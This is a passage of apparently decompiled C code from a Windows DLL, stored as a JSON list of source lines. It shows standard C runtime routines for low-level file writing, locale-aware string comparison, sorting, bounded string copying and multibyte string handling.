    "    if ( v9 )",
    "    {",
    "      v10 = 0;",
    "      while ( WriteFile(hFile, &MultiByteStr[v10], v9 - v10, &NumberOfBytesWritten, 0) )",
    "      {",
    "        v10 += NumberOfBytesWritten;",
    "        v9 = v12;",
    "        if ( v10 >= v12 )",
    "        {",
    "          a1[1] = (DWORD)v5 - a3;",
    "          if ( (unsigned int)v5 < v15 )",
    "            goto LABEL_2;",
    "          return v4;",
    "        }",
    "      }",
    "    }",
    "    *a1 = GetLastError();",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "int __cdecl _write(int FileHandle, const void *Buf, unsigned int MaxCharCount)",
    "{",
    "  int v3; // esi",
    "  _BYTE v5[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v5, 0);",
    "  v3 = _write_internal(FileHandle, (int)Buf, MaxCharCount, (__crt_cached_ptd_host *)v5);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v5);",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl _write_internal(int FileHandle, int a2, int a3, __crt_cached_ptd_host *a4)",
    "{",
    "  BOOL v5; // eax",
    "  int v6; // ebx",
    "  int v7; // [esp+10h] [ebp-24h]",
    "",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    return -1;",
    "  }",
    "  v5 = FileHandle >= 0 && FileHandle < (unsigned int)dword_10040590;",
    "  if ( !v5",
    "    || (v7 = 56 * (FileHandle & 0x3F), (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v7) & 1) == 0) )",
    "  {",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a4);",
    "    return -1;",
    "  }",
    "  __acrt_lowio_lock_fh(FileHandle);",
    "  v6 = -1;",
    "  if ( (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v7) & 1) != 0 )",
    "  {",
    "    v6 = _write_nolock(FileHandle, a2, a3, a4);",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "  }",
    "  __acrt_lowio_unlock_fh(FileHandle);",
    "  return v6;",
    "}",
    "",
    "",
    "int __cdecl _write_nolock(int FileHandle, const void *a2, DWORD a3, __crt_cached_ptd_host *a4)",
    "{",
    "  int v4; // ecx",
    "  int v6; // edi",
    "  LPCRITICAL_SECTION v7; // eax",
    "  char v8; // al",
    "  unsigned int v9; // edi",
    "  DWORD *v10; // eax",
    "  int *p_LastError; // esi",
    "  int v12; // edx",
    "  int v13; // ecx",
    "  LPCRITICAL_SECTION v14; // eax",
    "  void *v15; // ecx",
    "  int *v16; // esi",
    "  int LastError; // [esp+Ch] [ebp-30h] BYREF",
    "  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-2Ch] BYREF",
    "  int v19; // [esp+14h] [ebp-28h]",
    "  unsigned int v20; // [esp+18h] [ebp-24h]",
    "  int v21; // [esp+1Ch] [ebp-20h]",
    "  int v22; // [esp+20h] [ebp-1Ch]",
    "  int v23; // [esp+24h] [ebp-18h]",
    "  int v24; // [esp+28h] [ebp-14h]",
    "  int v25; // [esp+2Ch] [ebp-10h]",
    "  DWORD nNumberOfBytesToWrite; // [esp+30h] [ebp-Ch]",
    "  LPCVOID lpBuffer; // [esp+34h] [ebp-8h]",
    "  char v28; // [esp+3Bh] [ebp-1h]",
    "",
    "  v4 = FileHandle;",
    "  v25 = FileHandle;",
    "  lpBuffer = a2;",
    "  nNumberOfBytesToWrite = a3;",
    "  if ( a3 )",
    "  {",
    "    if ( !a2",
    "      || ((v6 = 56 * (FileHandle & 0x3F),",
    "           v24 = FileHandle >> 6,",
    "           v7 = lpCriticalSection[FileHandle >> 6],",
    "           v23 = v6,",
    "           v8 = *((_BYTE *)&v7[1].LockSemaphore + v6 + 1),",
    "           v28 = v8,",
    "           v8 == 2)",
    "       || v8 == 1)",
    "      && (a3 & 1) != 0 )",
    "    {",
    "      *((_BYTE *)a4 + 36) = 1;",
    "      *((_DWORD *)a4 + 8) = 0;",
    "      *((_BYTE *)a4 + 28) = 1;",
    "      *((_DWORD *)a4 + 6) = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a4);",
    "      return -1;",
    "    }",
    "    if ( (*((_BYTE *)&lpCriticalSection[v24][1].LockSemaphore + v6) & 0x20) != 0 )",
    "    {",
    "      _lseeki64_nolock_internal(FileHandle, 0, 2u, (int)a4);",
    "      v4 = v25;",
    "    }",
    "    v9 = 0;",
    "    v20 = 0;",
    "    if ( write_requires_double_translation_nolock(v4, a4) )",
    "    {",
    "      if ( v28 )",
    "      {",
    "        if ( (unsigned int)(v28 - 1) > 1 )",
    "        {",
    "LABEL_28:",
    "          v12 = v24;",
    "          v13 = v23;",
    "LABEL_29:",
    "          if ( v9 )",
    "          {",
    "            if ( v9 == 5 )",
    "            {",
    "              *((_BYTE *)a4 + 28) = 1;",
    "              *((_DWORD *)a4 + 6) = 9;",
    "              *((_BYTE *)a4 + 36) = 1;",
    "              *((_DWORD *)a4 + 8) = 5;",
    "            }",
    "            else",
    "            {",
    "              __acrt_errno_map_os_error_ptd(v9, (int)a4);",
    "            }",
    "            return -1;",
    "          }",
    "          if ( (*((_BYTE *)&lpCriticalSection[v12][1].LockSemaphore + v13) & 0x40) == 0 || *(_BYTE *)lpBuffer != 26 )",
    "          {",
    "            *((_BYTE *)a4 + 28) = 1;",
    "            *((_DWORD *)a4 + 6) = 28;",
    "            *((_BYTE *)a4 + 36) = 1;",
    "            *((_DWORD *)a4 + 8) = 0;",
    "            return -1;",
    "          }",
    "          return 0;",
    "        }",
    "        v10 = write_double_translated_unicode_nolock((DWORD *)&LastError, (unsigned int)lpBuffer, nNumberOfBytesToWrite);",
    "      }",
    "      else",
    "      {",
    "        v10 = sub_1002890A((DWORD *)&LastError, v25, (void *)lpBuffer, nNumberOfBytesToWrite, (struct _Mbstatet *)a4);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v12 = v24;",
    "      v13 = v23;",
    "      v14 = lpCriticalSection[v24];",
    "      if ( *((char *)&v14[1].LockSemaphore + v23) >= 0 )",
    "      {",
    "        v15 = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v14[1].DebugInfo + v23);",
    "        LastError = 0;",
    "        NumberOfBytesWritten = 0;",
    "        v19 = 0;",
    "        if ( !WriteFile(v15, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )",
    "          LastError = GetLastError();",
    "        p_LastError = &LastError;",
    "        goto LABEL_26;",
    "      }",
    "      if ( v28 )",
    "      {",
    "        if ( v28 == 1 )",
    "        {",
    "          v10 = write_text_utf8_nolock((DWORD *)&LastError, v25, (unsigned int)lpBuffer, nNumberOfBytesToWrite);",
    "        }",
    "        else",
    "        {",
    "          if ( v28 != 2 )",
    "            goto LABEL_29;",
    "          v10 = write_text_utf16le_nolock((DWORD *)&LastError, v25, (unsigned __int16 *)lpBuffer, nNumberOfBytesToWrite);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v10 = write_text_ansi_nolock((DWORD *)&LastError, v25, (unsigned int)lpBuffer, nNumberOfBytesToWrite);",
    "      }",
    "    }",
    "    p_LastError = (int *)v10;",
    "LABEL_26:",
    "    v20 = *p_LastError;",
    "    v16 = p_LastError + 1;",
    "    v21 = *v16;",
    "    v22 = v16[1];",
    "    if ( v21 )",
    "      return v21 - v22;",
    "    v9 = v20;",
    "    goto LABEL_28;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl __acrt_stdio_allocate_buffer_nolock(_DWORD *a1)",
    "{",
    "  int v1; // edi",
    "  volatile signed __int32 *v2; // eax",
    "  int result; // eax",
    "",
    "  ++dword_1004021C;",
    "  v1 = 4096;",
    "  a1[1] = sub_10023CF0(0x1000u, 1u);",
    "  _free_base(0);",
    "  v2 = a1 + 3;",
    "  if ( a1[1] )",
    "  {",
    "    _InterlockedOr(v2, 0x40u);",
    "  }",
    "  else",
    "  {",
    "    _InterlockedOr(v2, 0x400u);",
    "    a1[1] = a1 + 5;",
    "    v1 = 2;",
    "  }",
    "  a1[6] = v1;",
    "  result = a1[1];",
    "  a1[2] = 0;",
    "  *a1 = result;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl InternalCompareStringA(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwCmpFlags,",
    "        char *String,",
    "        int Count,",
    "        const char *a6,",
    "        int a7,",
    "        UINT CodePage)",
    "{",
    "  const char *v8; // ecx",
    "  int v9; // esi",
    "  size_t v10; // eax",
    "  signed int v11; // edi",
    "  UINT v12; // ebx",
    "  BYTE *LeadByte; // eax",
    "  unsigned __int8 v14; // cl",
    "  BYTE *i; // eax",
    "  unsigned __int8 v17; // cl",
    "  int v18; // eax",
    "  unsigned int v19; // eax",
    "  void *v20; // esp",
    "  _DWORD *v21; // ebx",
    "  _DWORD *v22; // eax",
    "  WCHAR *v23; // ebx",
    "  const CHAR *v24; // eax",
    "  unsigned int v25; // eax",
    "  void *v26; // esp",
    "  _DWORD *v27; // edi",
    "  _DWORD *v28; // eax",
    "  WCHAR *v29; // edi",
    "  int v30; // esi",
    "  _DWORD v32[3]; // [esp+0h] [ebp-34h] BYREF",
    "  wchar_t *v33; // [esp+Ch] [ebp-28h]",
    "  int cchWideChar; // [esp+10h] [ebp-24h]",
    "  LPCCH v35; // [esp+14h] [ebp-20h]",
    "  LPCCH lpMultiByteStr; // [esp+18h] [ebp-1Ch]",
    "  struct _cpinfo CPInfo; // [esp+1Ch] [ebp-18h] BYREF",
    "",
    "  v8 = a6;",
    "  cchWideChar = (int)a1;",
    "  v9 = Count;",
    "  v33 = a2;",
    "  lpMultiByteStr = String;",
    "  v35 = a6;",
    "  if ( Count <= 0 )",
    "  {",
    "    if ( Count < -1 )",
    "      return 0;",
    "  }",
    "  else",
    "  {",
    "    v10 = __strncnt(String, Count);",
    "    v8 = v35;",
    "    v9 = v10;",
    "  }",
    "  v11 = a7;",
    "  if ( a7 <= 0 )",
    "  {",
    "    if ( a7 < -1 )",
    "      return 0;",
    "  }",
    "  else",
    "  {",
    "    v11 = __strncnt(v8, a7);",
    "    a7 = v11;",
    "  }",
    "  v12 = CodePage;",
    "  if ( !CodePage )",
    "  {",
    "    v12 = *(_DWORD *)(*(_DWORD *)cchWideChar + 8);",
    "    CodePage = v12;",
    "  }",
    "  if ( !v9 || !v11 )",
    "  {",
    "    if ( v9 == v11 )",
    "      return 2;",
    "    if ( v11 > 1 )",
    "      return 1;",
    "    if ( v9 > 1 )",
    "      return 3;",
    "    if ( !GetCPInfo(v12, &CPInfo) )",
    "      return 0;",
    "    if ( v9 > 0 )",
    "    {",
    "      if ( CPInfo.MaxCharSize >= 2 )",
    "      {",
    "        LeadByte = CPInfo.LeadByte;",
    "        if ( CPInfo.LeadByte[0] )",
    "        {",
    "          while ( 1 )",
    "          {",
    "            v14 = LeadByte[1];",
    "            if ( !v14 )",
    "              break;",
    "            if ( (unsigned int)*lpMultiByteStr >= *LeadByte && (unsigned int)*lpMultiByteStr <= v14 )",
    "              return 2;",
    "            LeadByte += 2;",
    "            if ( !*LeadByte )",
    "              return 3;",
    "          }",
    "        }",
    "      }",
    "      return 3;",
    "    }",
    "    if ( v11 > 0 )",
    "    {",
    "      if ( CPInfo.MaxCharSize >= 2 )",
    "      {",
    "        for ( i = CPInfo.LeadByte; *i; i += 2 )",
    "        {",
    "          v17 = i[1];",
    "          if ( !v17 )",
    "            break;",
    "          if ( (unsigned int)*v35 >= *i && (unsigned int)*v35 <= v17 )",
    "            return 2;",
    "        }",
    "      }",
    "      return 1;",
    "    }",
    "  }",
    "  v18 = __acrt_MultiByteToWideChar(v12, 9u, lpMultiByteStr, v9, 0, 0);",
    "  cchWideChar = v18;",
    "  if ( !v18 )",
    "    return 0;",
    "  v19 = 2 * v18 < (unsigned int)(2 * v18 + 8) ? 2 * v18 + 8 : 0;",
    "  if ( !v19 )",
    "    goto LABEL_56;",
    "  if ( v19 <= 0x400 )",
    "  {",
    "    v20 = alloca(v19);",
    "    v21 = v32;",
    "    if ( v32 )",
    "    {",
    "      v32[0] = 52428;",
    "      goto LABEL_39;",
    "    }",
    "LABEL_56:",
    "    _freea_crt(0);",
    "    return 0;",
    "  }",
    "  v22 = sub_100202D0(v19);",
    "  v21 = v22;",
    "  if ( !v22 )",
    "    goto LABEL_56;",
    "  *v22 = 56797;",
    "LABEL_39:",
    "  v23 = (WCHAR *)(v21 + 2);",
    "  if ( !v23 )",
    "    goto LABEL_56;",
    "  if ( !__acrt_MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, v9, v23, cchWideChar)",
    "    || (v24 = (const CHAR *)__acrt_MultiByteToWideChar(CodePage, 9u, v35, v11, 0, 0), (lpMultiByteStr = v24) == 0) )",
    "  {",
    "    _freea_crt((int)v23);",
    "    return 0;",
    "  }",
    "  v25 = 2 * (int)v24 < (unsigned int)(2 * (_DWORD)v24 + 8) ? 2 * (_DWORD)v24 + 8 : 0;",
    "  if ( !v25 )",
    "    goto LABEL_54;",
    "  if ( v25 <= 0x400 )",
    "  {",
    "    v26 = alloca(v25);",
    "    v27 = v32;",
    "    if ( v32 )",
    "    {",
    "      v32[0] = 52428;",
    "      goto LABEL_48;",
    "    }",
    "LABEL_54:",
    "    _freea_crt(0);",
    "    goto LABEL_51;",
    "  }",
    "  v28 = sub_100202D0(v25);",
    "  v27 = v28;",
    "  if ( !v28 )",
    "    goto LABEL_54;",
    "  *v28 = 56797;",
    "LABEL_48:",
    "  v29 = (WCHAR *)(v27 + 2);",
    "  if ( !v29 )",
    "    goto LABEL_54;",
    "  if ( !__acrt_MultiByteToWideChar(CodePage, 1u, v35, a7, v29, (int)lpMultiByteStr) )",
    "  {",
    "    _freea_crt((int)v29);",
    "LABEL_51:",
    "    _freea_crt((int)v23);",
    "    return 0;",
    "  }",
    "  v30 = sub_10021D29(v33, dwCmpFlags, v23, cchWideChar, v29, (int)lpMultiByteStr, 0, 0, 0);",
    "  _freea_crt((int)v29);",
    "  _freea_crt((int)v23);",
    "  return v30;",
    "}",
    "",
    "",
    "int __cdecl __acrt_CompareStringA(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwCmpFlags,",
    "        char *String,",
    "        size_t Count,",
    "        char *a6,",
    "        size_t a7,",
    "        UINT CodePage)",
    "{",
    "  int result; // eax",
    "  int v9; // [esp+0h] [ebp-10h] BYREF",
    "  struct __crt_locale_pointers v10; // [esp+4h] [ebp-Ch] BYREF",
    "  char v11; // [esp+Ch] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a1);",
    "  result = InternalCompareStringA(&v10, a2, dwCmpFlags, String, Count, a6, a7, CodePage);",
    "  if ( v11 )",
    "    *(_DWORD *)(v9 + 848) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __cdecl __acrt_GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType)",
    "{",
    "  return GetStringTypeW(dwInfoType, lpSrcStr, cchSrc, lpCharType);",
    "}",
    "",
    "",
    "void __cdecl sub_10029770(char *a1, unsigned int a2, int a3, int (__cdecl *a4)(char *, char *))",
    "{",
    "  int (__cdecl *v4)(char *, char *); // ebx",
    "  unsigned int v5; // esi",
    "  unsigned int v6; // edi",
    "  char *v7; // ecx",
    "  unsigned int v8; // eax",
    "  unsigned int v9; // eax",
    "  unsigned int v10; // ebx",
    "  int v11; // eax",
    "  unsigned int v12; // ecx",
    "  unsigned int v13; // ebx",
    "  char *v14; // edx",
    "  unsigned int v15; // edi",
    "  char v16; // al",
    "  char v17; // cl",
    "  int v18; // eax",
    "  int v19; // eax",
    "  char *v20; // edi",
    "  bool v21; // cc",
    "  char *v22; // eax",
    "  char *v23; // ebx",
    "  unsigned int v24; // edi",
    "  char v25; // cl",
    "  char *v26; // ebx",
    "  char *v27; // edx",
    "  int v28; // ebx",
    "  char v29; // al",
    "  char v30; // cl",
    "  int v31; // eax",
    "  int v32; // ecx",
    "  int v33; // esi",
    "  char *v34; // edx",
    "  int v35; // ebx",
    "  char v36; // al",
    "  char v37; // cl",
    "  unsigned int v38; // esi",
    "  int v39; // eax",
    "  int v40; // eax",
    "  char *v41; // eax",
    "  char *v42; // edx",
    "  int v43; // esi",
    "  int v44; // ebx",
    "  char v45; // al",
    "  char v46; // cl",
    "  char *v47; // eax",
    "  int v48; // eax",
    "  bool v49; // zf",
    "  char *v50; // eax",
    "  int v51; // eax",
    "  int v52; // [esp+10h] [ebp-114h]",
    "  char *v53; // [esp+14h] [ebp-110h]",
    "  unsigned int v54; // [esp+18h] [ebp-10Ch]",
    "  int v55; // [esp+18h] [ebp-10Ch]",
    "  char *v56; // [esp+18h] [ebp-10Ch]",
    "  char *v57; // [esp+1Ch] [ebp-108h]",
    "  char *v58; // [esp+20h] [ebp-104h]",
    "  char *v59; // [esp+20h] [ebp-104h]",
    "  char *v60; // [esp+20h] [ebp-104h]",
    "  char *v61; // [esp+24h] [ebp-100h]",
    "  _DWORD v62[60]; // [esp+30h] [ebp-F4h]",
    "",
    "  v61 = a1;",
    "  v4 = (int (__cdecl *)(char *, char *))a4;",
    "  v5 = a3;",
    "  if ( (a1 || !a2) && a3 && a4 )",
    "  {",
    "    v52 = 0;",
    "    if ( a2 >= 2 )",
    "    {",
    "      v6 = (unsigned int)a1;",
    "      v7 = &a1[a3 * (a2 - 1)];",
    "LABEL_9:",
    "      while ( 2 )",
    "      {",
    "        v57 = v7;",
    "        while ( 1 )",
    "        {",
    "          v8 = (unsigned int)&v7[-v6] / v5 + 1;",
    "          if ( v8 <= 8 )",
    "          {",
    "            if ( (unsigned int)v7 <= v6 )",
    "              goto LABEL_23;",
    "            v9 = v5 + v6;",
    "            v54 = v5 + v6;",
    "            do",
    "            {",
    "              v10 = v9;",
    "              if ( v9 <= (unsigned int)v7 )",
    "              {",
    "                do",
    "                {",
    "                  v11 = a4(v10, v6);",
    "                  v12 = v10;",
    "                  if ( v11 <= 0 )",
    "                    v12 = v6;",
    "                  v10 += v5;",
    "                  v6 = v12;",
    "                  v7 = v57;",
    "                }",
    "                while ( v10 <= (unsigned int)v57 );",
    "              }",
    "              v13 = v5;",
    "              v14 = v7;",
    "              if ( (char *)v6 != v7 )",
    "              {",
    "                v15 = v6 - (_DWORD)v7;",
    "                do",
    "                {",
    "                  v16 = *v14++;",
    "                  v17 = v14[v15 - 1];",
    "                  v14[v15 - 1] = v16;",
    "                  *(v14 - 1) = v17;",
    "                  --v13;",
    "                }",
    "                while ( v13 );",
    "                v7 = v57;",
    "              }",
    "              v6 = (unsigned int)v61;",
    "              v7 -= v5;",
    "              v9 = v54;",
    "              v57 = v7;",
    "            }",
    "            while ( v7 > v61 );",
    "LABEL_22:",
    "            v4 = (int (__cdecl *)(char *, char *))a4;",
    "            goto LABEL_23;",
    "          }",
    "          v19 = v5 * (v8 >> 1);",
    "          v20 = (char *)(v19 + v6);",
    "          v55 = v19;",
    "          v53 = v20;",
    "          v21 = v4(v61, v20) <= 0;",
    "          v22 = v61;",
    "          if ( !v21 )",
    "          {",
    "            v23 = v20;",
    "            if ( v61 != v20 )",
    "            {",
    "              v24 = v5;",
    "              do",
    "              {",
    "                v25 = v23[-v55];",
    "                v23[-v55] = *v23;",
    "                *v23++ = v25;",
    "                --v24;",
    "              }",
    "              while ( v24 );",
    "              v20 = v53;",
    "              v5 = a3;",
    "              v22 = v61;",
    "            }",
    "          }",
    "          v26 = v57;",
    "          if ( a4(v22, v57) > 0 )",
    "          {",
    "            v27 = v57;",
    "            if ( v61 != v57 )",
    "            {",
    "              v28 = v61 - v57;",
    "              do",
    "              {",
    "                v29 = *v27++;",
    "                v30 = v27[v28 - 1];",
    "                v27[v28 - 1] = v29;",
    "                *(v27 - 1) = v30;",
    "                --v5;",
    "              }",
    "              while ( v5 );",
    "              v26 = v57;",
    "            }",
    "          }",
    "          v31 = a4(v20, v26);",
    "          v32 = a3;",
    "          if ( v31 > 0 )",
    "          {",
    "            v33 = a3;",
    "            v34 = v26;",
    "            if ( v20 != v26 )",
    "            {",
    "              v35 = v20 - v26;",
    "              do",
    "              {",
    "                v36 = *v34++;",
    "                v37 = v34[v35 - 1];",
    "                v34[v35 - 1] = v36;",
    "                *(v34 - 1) = v37;",
    "                --v33;",
    "              }",
    "              while ( v33 );",
    "              v32 = a3;",
    "              v26 = v57;",
    "            }",
    "          }",
    "          v38 = (unsigned int)v61;",
    "          v58 = v26;",
    "          while ( 1 )",
    "          {",
    "            if ( (unsigned int)v20 > v38 )",
    "            {",
    "              while ( 1 )",
    "              {",
    "                v38 += v32;",
    "                v56 = (char *)v38;",
    "                if ( v38 >= (unsigned int)v20 )",
    "                  break;",
    "                v39 = a4(v38, v20);",
    "                v32 = a3;",
    "                if ( v39 > 0 )",
    "                  goto LABEL_48;",
    "              }",
    "            }",
    "            do",
    "            {",
    "              v38 += v32;",
    "              if ( v38 > (unsigned int)v57 )",
    "                break;",
    "              v40 = a4(v38, v20);",
    "              v32 = a3;",
    "            }",
    "            while ( v40 <= 0 );",
    "            v26 = v58;",
    "            v56 = (char *)v38;",
    "LABEL_48:",
    "            while ( 1 )",
    "            {",
    "              v32 = a3;",
    "              v41 = v26;",
    "              v26 -= a3;",
    "              v59 = v41;",
    "              if ( v26 <= v20 )",
    "                break;",
    "              if ( a4(v26, v20) <= 0 )",
    "              {",
    "                v32 = a3;",
    "                v41 = v59;",
    "                break;",
    "              }",
    "            }",
    "            v38 = (unsigned int)v56;",
    "            v58 = v26;",
    "            if ( v26 < v56 )",
    "              break;",
    "            v42 = v26;",
    "            if ( v26 != v56 )",
    "            {",
    "              v43 = v56 - v26;",
    "              v44 = v32;",
    "              do",
    "              {",
    "                v45 = *v42++;",
    "                v46 = v42[v43 - 1];",
    "                v42[v43 - 1] = v45;",
    "                *(v42 - 1) = v46;",
    "                --v44;",
    "              }",
    "              while ( v44 );",
    "              v38 = (unsigned int)v56;",
    "              v26 = v58;",
    "              v32 = a3;",
    "            }",
    "            v47 = (char *)v38;",
    "            if ( v20 != v26 )",
    "              v47 = v20;",
    "            v20 = v47;",
    "          }",
    "          if ( v20 < v41 )",
    "          {",
    "            while ( 1 )",
    "            {",
    "              v41 -= v32;",
    "              v60 = v41;",
    "              if ( v41 <= v20 )",
    "                break;",
    "              v48 = a4(v41, v20);",
    "              v32 = a3;",
    "              v49 = v48 == 0;",
    "              v41 = v60;",
    "              if ( !v49 )",
    "                goto LABEL_66;",
    "            }",
    "          }",
    "          do",
    "          {",
    "            v50 = &v41[-v32];",
    "            v60 = v50;",
    "            if ( v50 <= v61 )",
    "              break;",
    "            v51 = a4(v50, v20);",
    "            v32 = a3;",
    "            v49 = v51 == 0;",
    "            v41 = v60;",
    "          }",
    "          while ( v49 );",
    "          v38 = (unsigned int)v56;",
    "LABEL_66:",
    "          v6 = (unsigned int)v61;",
    "          if ( v60 - v61 < (int)&v57[-v38] )",
    "          {",
    "            if ( v38 < (unsigned int)v57 )",
    "            {",
    "              v62[v52 + 30] = v38;",
    "              v62[v52++] = v57;",
    "            }",
    "            v5 = a3;",
    "            if ( v61 >= v60 )",
    "              goto LABEL_22;",
    "            v4 = (int (__cdecl *)(char *, char *))a4;",
    "            v7 = v60;",
    "            goto LABEL_9;",
    "          }",
    "          if ( v61 < v60 )",
    "          {",
    "            v62[v52 + 30] = v61;",
    "            v62[v52++] = v60;",
    "          }",
    "          v7 = v57;",
    "          v4 = (int (__cdecl *)(char *, char *))a4;",
    "          if ( v38 >= (unsigned int)v57 )",
    "            break;",
    "          v6 = v38;",
    "          v5 = a3;",
    "          v61 = (char *)v6;",
    "        }",
    "        v5 = a3;",
    "LABEL_23:",
    "        v18 = --v52;",
    "        if ( v52 >= 0 )",
    "        {",
    "          v6 = v62[v18 + 30];",
    "          v7 = (char *)v62[v18];",
    "          v61 = (char *)v6;",
    "          continue;",
    "        }",
    "        break;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_10029BAC(_BYTE *a1, int a2, int a3, int a4)",
    "{",
    "  _DWORD *v4; // eax",
    "  int v6; // esi",
    "  int v7; // ebx",
    "  int v8; // eax",
    "  _BYTE *v9; // edx",
    "  char v10; // al",
    "  char v11; // al",
    "  int v12; // eax",
    "  int v13; // [esp-4h] [ebp-18h]",
    "  int v14; // [esp+Ch] [ebp-8h]",
    "  int v15; // [esp+10h] [ebp-4h]",
    "",
    "  if ( a4 )",
    "  {",
    "    if ( !a1 )",
    "      goto LABEL_4;",
    "  }",
    "  else if ( !a1 )",
    "  {",
    "    if ( a2 )",
    "      goto LABEL_4;",
    "    return 0;",
    "  }",
    "  if ( a2 )",
    "  {",
    "    if ( !a4 )",
    "    {",
    "      *a1 = 0;",
    "      return 0;",
    "    }",
    "    if ( a3 )",
    "    {",
    "      v6 = a2;",
    "      v7 = a3 - (_DWORD)a1;",
    "      v8 = a4;",
    "      v9 = a1;",
    "      v15 = a4;",
    "      if ( a4 == -1 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v10 = v9[v7];",
    "          *v9++ = v10;",
    "          if ( !v10 )",
    "            break;",
    "          if ( !--v6 )",
    "            goto LABEL_24;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v14 = v8;",
    "          v11 = v9[v7];",
    "          *v9++ = v11;",
    "          if ( !v11 )",
    "            break;",
    "          if ( --v6 )",
    "          {",
    "            v8 = --v15;",
    "            if ( v15 )",
    "              continue;",
    "          }",
    "          v12 = v14 - 1;",
    "          if ( !v6 )",
    "            v12 = v14;",
    "          if ( !v12 )",
    "            *v9 = 0;",
    "LABEL_24:",
    "          if ( v6 )",
    "            return 0;",
    "          if ( a4 == -1 )",
    "          {",
    "            a1[a2 - 1] = 0;",
    "            return 80;",
    "          }",
    "          *a1 = 0;",
    "          v4 = sub_1001E025();",
    "          v13 = 34;",
    "          goto LABEL_5;",
    "        }",
    "      }",
    "      return 0;",
    "    }",
    "    *a1 = 0;",
    "  }",
    "LABEL_4:",
    "  v4 = sub_1001E025();",
    "  v13 = 22;",
    "LABEL_5:",
    "  *v4 = v13;",
    "  _invalid_parameter_noinfo();",
    "  return v13;",
    "}",
    "",
    "",
    "int __cdecl sub_10029C77(_BYTE *a1, int a2, int a3, int a4)",
    "{",
    "  return sub_10029BAC(a1, a2, a3, a4);",
    "}",
    "",
    "",
    "char *__cdecl strpbrk(const char *Str, const char *Control)",
    "{",
    "  char *result; // eax",
    "  signed __int32 v5[9]; // [esp+0h] [ebp-24h] BYREF",
    "",
    "  result = 0;",
    "  memset(v5, 0, 32);",
    "  while ( 1 )",
    "  {",
    "    LOBYTE(result) = *Control;",
    "    if ( !*Control )",
    "      break;",
    "    ++Control;",
    "    _bittestandset(v5, (unsigned int)result);",
    "  }",
    "  while ( 1 )",
    "  {",
    "    LOBYTE(result) = *Str;",
    "    if ( !*Str )",
    "      break;",
    "    ++Str;",
    "    if ( _bittest(v5, (unsigned int)result) )",
    "      return (char *)(Str - 1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int8 *__cdecl _mbsdec(const unsigned __int8 *Start, const unsigned __int8 *Pos)",
    "{",
    "  return _mbsdec_l(Start, Pos, 0);",
    "}",
    "",
    "",
    "unsigned __int8 *__cdecl _mbsdec_l(const unsigned __int8 *Start, const unsigned __int8 *Pos, _locale_t Locale)",
    "{",
    "  unsigned __int8 *v4; // edx",
    "  int v5; // [esp+0h] [ebp-10h] BYREF",
    "  int v6; // [esp+8h] [ebp-8h]",
    "  char v7; // [esp+Ch] [ebp-4h]",
    "",
    "  if ( !Start )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  if ( !Pos )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  if ( Start >= Pos )",
    "    return 0;",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v5, Locale);",
    "  v4 = (unsigned __int8 *)(Pos - 1);",
    "  if ( *(_DWORD *)(v6 + 8) )",
    "  {",
    "    do",
    "      --v4;",
    "    while ( Start <= v4 && (*(_BYTE *)(*v4 + v6 + 25) & 4) != 0 );",
    "    v4 = (unsigned __int8 *)&Pos[-(((_BYTE)Pos - (_BYTE)v4) & 1) - 1];",
    "  }",
    "  if ( v7 )",
    "    *(_DWORD *)(v5 + 848) &= ~2u;",
    "  return v4;",
    "}",
    "",
    "",
    "int __cdecl __acrt_LCMapStringA_stat(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwMapFlags,",
    "        char *String,",
    "        int Count,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        UINT CodePage,",
